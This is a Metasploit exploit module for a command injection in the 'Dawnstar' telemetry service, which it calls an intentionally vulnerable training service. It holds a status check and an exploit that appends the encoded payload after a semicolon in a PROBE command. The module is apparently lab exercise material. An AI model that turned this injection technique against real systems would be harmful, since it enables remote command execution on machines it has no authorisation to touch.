class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Dawnstar Telemetry PROBE Command Injection',
      'Description' => %q{Executes an operating-system command through the intentionally vulnerable Dawnstar training telemetry service.},
      'Author' => ['Sunset Tech Labs'],
      'License' => MSF_LICENSE,
      'Platform' => 'unix',
      'Arch' => ARCH_CMD,
      'Targets' => [['Automatic', {}]],
      'DefaultTarget' => 0,
      'Payload' => {'BadChars' => "\x00\x0a\x0d"}
    ))
    register_options([Opt::RPORT(4040)])
  end

  def check
    connect
    sock.get_once
    sock.put("STATUS\n")
    response = sock.get_once
    response&.include?('telemetry nominal') ? CheckCode::Vulnerable : CheckCode::Safe
  ensure
    disconnect
  end

  def exploit
    connect
    sock.get_once
    sock.put("PROBE 127.0.0.1; #{payload.encoded}\n")
    handler
  ensure
    disconnect
  end
end
